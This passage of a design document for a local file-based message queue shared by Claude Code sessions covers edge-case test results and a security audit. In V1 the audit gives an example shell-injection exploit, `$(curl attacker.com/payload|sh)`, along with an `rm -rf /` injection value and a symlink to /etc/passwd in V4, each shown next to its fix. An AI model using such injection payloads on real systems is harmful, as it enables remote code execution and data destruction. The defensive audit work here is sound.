| Expected | Stale entry reaped, new session registered, exit 0 |
| Observed | Stale entry removed, bit recycled and reassigned to new session. Exit 0. |
| Status | **OK** |

---

#### EC-21 — Register with corrupt registry

| Field | Value |
|-------|-------|
| Description | `registry.json` contains invalid JSON |
| Expected | Exit 10 |
| Observed | Exit 10. No registry mutation. |
| Status | **OK** |

---

#### EC-22 — Bit recycling: stale ack files drained on recycle

| Field | Value |
|-------|-------|
| Description | Session B (bit=1) acks a message, then deregisters. New session C reuses bit=1. |
| Expected | `register.sh` drains `ack/1` from all existing messages before assigning bit=1 to C |
| Observed | `ack/<bit>` file correctly removed during the recycled bit's draining pass in `register.sh`. |
| Status | **OK** |

**Why this matters:** If not drained, session C would appear to have already acked messages it never read, causing them to be GC'd prematurely (violating the GC safety invariant §2.4).

---

### 9.5 Concurrency Edge Cases

#### EC-23 — Concurrent register — mktemp collision

| Field | Value |
|-------|-------|
| Description | Two calls to `register.sh` run simultaneously in different processes |
| Expected | Both succeed with unique bit assignments |
| Observed | Both succeed. |
| Status | **FIXED** |

**Original bug:** `register.sh` used `mktemp /tmp/reg_inner.XXXXXX.sh` — the `.sh` suffix after the template markers caused collisions on macOS when two processes called mktemp simultaneously.

**Fix applied:** All four affected scripts now use PID-stamped paths that guarantee uniqueness:
```bash
_INNER=$(mktemp "${TMPDIR:-/tmp}/reg_inner_$$.XXXXXX")
```
Including `$$` (the process PID) in the template prefix makes collisions impossible between distinct processes. Applied to `register.sh`, `gc.sh`, `deregister.sh`, and `heartbeat.sh`.

---

#### EC-24 — Concurrent send and GC

| Field | Value |
|-------|-------|
| Description | `send.sh` and `gc.sh` run simultaneously |
| Expected | Either: (a) message fully published before GC scan — message exists; or (b) message not yet published — GC sees nothing. Message never partially visible. |
| Observed | Message visible and intact after concurrent send+GC. |
| Status | **OK** |

**Why safe:** `send.sh` uses `rename()` for atomic publish (§5.3). GC only sees the final published directory — never a staging `.tmp-*` dir (confirmed bug EC-15 notwithstanding — dotfiles excluded from GC loop means staging dirs are safe from accidental GC deletion too). GC only deletes fully-acked messages; a just-published, unacked message is never eligible.

---

#### EC-25 — Multiple concurrent sends

| Field | Value |
|-------|-------|
| Description | 5 concurrent `send.sh` calls from the same session |
| Expected | All 5 messages stored, no data loss |
| Observed | All 5 messages stored. Each uses a unique `uuidgen`-based directory name; no collision possible. |
| Status | **OK** |

**Why safe:** UUID v4 collision probability is negligible (~10⁻³⁶ per pair). `mkdir` for staging is atomic and returns `EEXIST` on collision. Each send uses an independent staging directory.

---

### 9.6 Status Edge Cases

#### EC-26 — Status with empty queue

| Field | Value |
|-------|-------|
| Description | `status.sh` on a clean, uninitialized queue |
| Expected | Displays session count 0, exits 0 |
| Observed | Displays `--- Sessions (0 registered) ---`, exits 0 |
| Status | **OK** |

---

#### EC-27 — Status with missing messages/ directory

| Field | Value |
|-------|-------|
| Description | `messages/` directory removed before calling `status.sh` |
| Expected | Graceful handling, no crash |
| Observed | `status.sh` detects missing directory and prints `messages/ directory not found`. Exits 0. |
| Status | **OK** |

---

#### EC-28 — Status with corrupt registry

| Field | Value |
|-------|-------|
| Description | `registry.json` contains invalid JSON |
| Expected | Exit 10 |
| Observed | Exit 10 |
| Status | **OK** |

---

### 9.7 Summary Table

| ID | Case | Status | Severity |
|----|------|--------|----------|
| EC-1 | Name with spaces/special chars rejected | OK | — |
| EC-2 | Empty body accepted | OK | — |
| EC-3 | Large body (>10KB) accepted | OK (risk: no size limit) | Low |
| EC-4 | Body with newlines/quotes/JSON/metacharacters | OK | — |
| EC-5 | Invalid message type rejected | OK | — |
| EC-6 | Ack with invalid UUID format rejected | OK | — |
| EC-7 | Poll on empty queue returns `[]` exit=1 | OK | — |
| EC-8 | Ack non-existent message → exit=4 | OK | — |
| EC-9 | Ack message not addressed to caller → exit=5 | OK | — |
| EC-10 | Double ack idempotent | OK | — |
| EC-11 | Acked message not returned by poll | OK | — |
| EC-12 | GC on empty queue → 0, exit=0 | OK | — |
| EC-13 | GC does not delete partially-acked message | OK | — |
| EC-14 | GC deletes TTL-expired messages | OK | — |
| EC-15 | GC cleans orphaned .tmp-* dirs (separate loop) | FIXED | — |
| EC-16 | GC with missing registry → skip phase 2 | OK | — |
| EC-17 | GC with corrupt registry → exit=10 | OK | — |
| EC-18 | Deregister non-existent session → exit=6 | OK | — |
| EC-19 | Register duplicate live session → exit=2 | OK | — |
| EC-20 | Register reaps stale (dead PID) session | OK | — |
| EC-21 | Register with corrupt registry → exit=10 | OK | — |
| EC-22 | Bit recycling drains stale ack files | OK | — |
| EC-23 | Concurrent register: mktemp collision (PID-stamp fix) | FIXED | — |
| EC-24 | Concurrent send+GC → message safe | OK | — |
| EC-25 | Multiple concurrent sends → all stored | OK | — |
| EC-26 | Status empty queue | OK | — |
| EC-27 | Status with missing messages/ | OK | — |
| EC-28 | Status with corrupt registry → exit=10 | OK | — |

**Bugs found and fixed:** 2
- **EC-15**: GC now uses a dedicated `.tmp-*/` loop — bash glob `*/` was skipping dotfiles (fixed)
- **EC-23**: `mktemp` templates now include PID (`$$`) — eliminates concurrent collision risk (fixed)

---

## 10. Security Model

<!-- Owner: security-auditor -->

### 10.1 Threat Model

**Attacker profile:** The primary threat actor is a **malicious process running as the same OS user**. Since all queue data resides in `~/.claude/team-queue/` with user-level permissions, any process running under the same UID has full read/write access to the queue.

**Out of scope:** Multi-user attacks (different UIDs) are mitigated by filesystem permissions (§10.3). Remote/network attacks are not applicable — the queue is local-only, never exposed over the network.

**Trust boundaries:**

| Component | Trust Level | Rationale |
|-----------|-------------|-----------|
| Claude Code sessions | **Trusted** | The cooperating agents that follow the protocol |
| Hook scripts | **Trusted** | Installed by setup.sh, executed by Claude Code |
| Environment variables | **Semi-trusted** | Set by the parent process; could be manipulated |
| Filesystem contents | **Semi-trusted** | Could be modified by any same-user process |
| Message body content | **Untrusted** | Arbitrary UTF-8 from any session |

### 10.2 Vulnerability Analysis

#### V1 — Shell Injection via Heredoc Variable Expansion

**Severity: Critical (fixed)**

**Description:** Scripts `register.sh`, `gc.sh`, `heartbeat.sh`, and `deregister.sh` generated inner scripts using unquoted heredocs (`<< INNEREOF`), which caused shell variable expansion. Variables like `TEAM_QUEUE_DIR` were interpolated directly into the shell script text. If `TEAM_QUEUE_DIR` contained shell metacharacters (e.g., `"; rm -rf /; "`), arbitrary code would execute inside the inner script.

**Example exploit:**
```bash
TEAM_QUEUE_DIR='$(curl attacker.com/payload|sh)' bash register.sh test
```

**Fix applied:** All heredocs changed to quoted form (`<< 'INNEREOF'`). Variables are now passed via `export` and read from the environment inside the inner script, preventing expansion during script generation.

**Files fixed:** `register.sh`, `gc.sh`, `heartbeat.sh`, `deregister.sh`

#### V2 — TEAM_QUEUE_DIR Path Traversal / Injection

**Severity: High (mitigated)**

**Description:** `TEAM_QUEUE_DIR` is read from the environment in every script. A malicious parent process could set it to a path containing `../` or shell metacharacters to redirect queue operations to arbitrary locations.

**Fix applied:** `register.sh` now validates that `TEAM_QUEUE_DIR` is an absolute path and rejects paths containing shell metacharacters (`;|&$\`(){}\\`). Other scripts inherit this validation through the registration flow (a session must register before any other operation).

**Residual risk:** Scripts called directly without prior registration (e.g., `status.sh`, `gc.sh`) do not independently validate `TEAM_QUEUE_DIR`. This is acceptable because these scripts only read files at the specified path — they do not generate shell code from it (post-fix).

#### V3 — TEAM_MSG_REPLY_TO Payload Injection

**Severity: Medium (fixed)**

**Description:** In `send.sh`, `TEAM_MSG_REPLY_TO` was embedded into a JSON string via string interpolation (`"\"${TEAM_MSG_REPLY_TO}\""`) and passed to `jq --argjson`. If the value contained `"`, it would produce malformed JSON. While `jq` would reject it (preventing actual injection), the error handling was fragile.

**Fix applied:** `TEAM_MSG_REPLY_TO` is now validated against the UUID v4 regex before use. Only valid UUIDs or the literal `"null"` are accepted.

**File fixed:** `send.sh`

#### V4 — Symlink Attacks in messages/

**Severity: Medium (not exploitable in practice)**

**Description:** A malicious process could create a symlink inside `messages/` pointing to a sensitive file (e.g., `ln -s /etc/passwd messages/fake-uuid/required`). The `poll.sh` or `gc.sh` scripts would then read or delete files outside the queue.

**Analysis:**
- `poll.sh` only reads files — no data corruption risk.
- `gc.sh` uses `rm -rf` on message directories, which follows symlinks for file deletion but not for directory traversal on macOS. `rm -rf messages/<uuid>/` where `<uuid>` is a symlink to a directory would remove the symlink itself, not the target.
- The `mkdir` in `send.sh` for staging directories would fail if a symlink already exists at that path (`mkdir` does not follow symlinks for creation).

**Mitigation present:** Directory permissions set to `700` by `setup.sh` (§10.3). The attacker must be the same user, who already has direct access to any file they could target via symlink.

**Recommendation:** For defense-in-depth, scripts could use `realpath` to verify that resolved paths stay within `TEAM_QUEUE_DIR`.

#### V5 — TOCTOU Races

**Severity: Low**

**Description:** Several check-then-act sequences exist:
1. `poll.sh`: checks `required` file, then reads `payload.json` — file may disappear (concurrent GC)
2. `gc.sh`: checks `ack_mask == required`, then `rm -rf` — a new ack could arrive between check and delete
3. `register.sh`: checks if name is taken, then registers — concurrent registration could race

**Analysis:**
- (1) is handled: all scripts catch ENOENT and `continue`.
- (2) is safe by design: GC only deletes fully-acked messages, and the ack G-Set is monotonic — a late ack on an already-fully-acked message is harmless.
- (3) is protected by `lockf` — all registry mutations are serialized.

**Residual risk:** None actionable. The CRDT model is specifically designed to tolerate these races.

#### V6 — Denial of Service

**Severity: Medium (no mitigation)**

**Description:** A malicious process could:
1. **Message flooding:** Create thousands of directories in `messages/`, causing `poll.sh` to scan them all.
2. **Bit exhaustion:** Register many sessions to exhaust bit-positions, making bitmasks unwieldy.
3. **Lock starvation:** Hold `registry.lock` indefinitely, blocking all registry operations.
4. **Disk exhaustion:** Fill `messages/` with large payload files.

**Mitigations present:**
- Lock timeout (`lockf -k -t 5`) prevents infinite blocking (5s max).
- TTL-based GC eventually cleans expired messages.
- `next_bit` grows linearly — bash arithmetic supports 64-bit integers, allowing up to 63 concurrent sessions.

**Mitigations missing:**
- No per-session message rate limit.
- No maximum message size.
- No maximum number of pending messages.

**Recommendation:** Add optional limits via environment variables: `TEAM_MAX_MESSAGES` (default 1000), `TEAM_MAX_PAYLOAD_SIZE` (default 64KB). Enforce in `send.sh` before writing the payload.

#### V7 — Session Impersonation

**Severity: Medium (partially mitigated)**

**Description:** A malicious process could forge a `.sessions/<PID>.bit` file to impersonate another session's bit-position, allowing it to:
- Read messages intended for another session
- Ack messages on behalf of another session (advancing the ack-mask)
- Send messages appearing to come from another session

**Mitigations present:**
- `start_time` validation in GC detects PID recycling.
- `.sessions/` directory has mode 700.
- Session names are validated against `[a-zA-Z0-9_-]+`.

**Residual risk:** A same-user process can write arbitrary `.sessions/*.bit` files. This is inherent to the single-user threat model — the attacker has the same access as the legitimate sessions.

#### V8 — Information Leakage

**Severity: Low (mitigated)**

**Description:** Message payloads, registry data, and session state are stored as plaintext JSON files. Any process running as the same user can read all queue data.

**Fix applied:** `setup.sh` now sets directory permissions to `700` and `registry.json` to `600`, preventing access by other users on the system.

**Residual risk:** Same-user processes can still read all data. This is by design — the queue is a shared communication medium between same-user sessions.

#### V9 — jq Injection

**Severity: None (not exploitable)**

**Description:** Message body content is passed to `jq` via `--arg`, which treats the value as a literal string, not as a jq expression. The `--arg` flag properly escapes all special characters including quotes, backslashes, and null bytes.

**Analysis:** All `jq` invocations use `--arg` for user-provided strings (body, name, target) and `--argjson` only for numeric/known-safe values. No user input is interpolated into jq filter expressions.

#### V10 — Registry Corruption via Partial Write

**Severity: Low (mitigated)**

**Description:** If the process crashes during `jq '.' > registry.json`, the file could be left in a partially-written state.

**Mitigation present:** All registry writes use the write-to-tmp-then-rename pattern: `mktemp registry.json.XXXXXX` + `jq` write + `mv`. This is atomic on APFS (§5.3).

#### V11 — Payload Control Sequence Injection

**Severity: Low (informational)**

**Description:** A message body could contain terminal escape sequences (e.g., ANSI codes) or prompt injection strings. When `check-messages.sh` displays the body via `echo`, these sequences would be interpreted by the terminal.

**Mitigation present:** `check-messages.sh` truncates body to 80 characters, limiting the attack surface.

**Recommendation:** For defense-in-depth, strip or escape control characters before display: `echo "${BODY}" | tr -d '[:cntrl:]'`.

### 10.3 Permission Model

| Path | Mode | Purpose |
|------|------|---------|
| `~/.claude/team-queue/` | `700` | Root queue directory — owner-only access |
| `messages/` | `700` | Published messages — owner-only |
| `.sessions/` | `700` | Session state files — owner-only |
| `registry.json` | `600` | Session registry — owner read/write |
| `registry.lock` | `600` | Advisory lock file |
| `messages/<uuid>/payload.json` | default (644) | Immutable after publish |
| `messages/<uuid>/required` | default (644) | Immutable after publish |
| `messages/<uuid>/ack/<bit>` | default (644) | Created by touch — idempotent |

**Note:** Payload and ack files inherit the umask-default mode. Since the parent directory is `700`, they are not accessible to other users regardless of individual file permissions.

### 10.4 Security Invariants

**SI-1 — No shell metacharacter expansion in generated scripts.** All heredoc inner scripts use quoted delimiters (`<< 'EOF'`). Variables are passed via `export` and read from the environment.

**SI-2 — All user-provided strings pass through validation.** Session names match `[a-zA-Z0-9_-]+`. Message IDs match UUID v4 regex. Message types are enum-validated. `TEAM_QUEUE_DIR` is validated as an absolute path without shell metacharacters.

**SI-3 — All JSON construction uses jq --arg.** No string interpolation into JSON. User input never appears unescaped in JSON output.

**SI-4 — All registry mutations are serialized under lockf.** The lock has a 5-second timeout to prevent deadlock.

**SI-5 — All file writes use write-to-tmp-then-rename.** No partial writes are visible to readers.

### 10.5 Recommendations (Not Yet Implemented)

| Priority | Recommendation | Rationale |
|----------|---------------|-----------|
| Medium | Add `TEAM_MAX_MESSAGES` and `TEAM_MAX_PAYLOAD_SIZE` limits to `send.sh` | Mitigates DoS via message flooding and disk exhaustion |
| Low | Strip control characters from body in `check-messages.sh` display | Prevents terminal escape sequence injection |
| Low | Use `realpath` to validate resolved paths stay within `TEAM_QUEUE_DIR` | Defense-in-depth against symlink attacks |
| Low | Add msg_id UUID validation in `gc.sh` and `status.sh` directory scanning loops | Consistent with `poll.sh` validation |

---

## 11. Open Questions

<!-- All agents can append here -->

_Aucune pour l'instant_
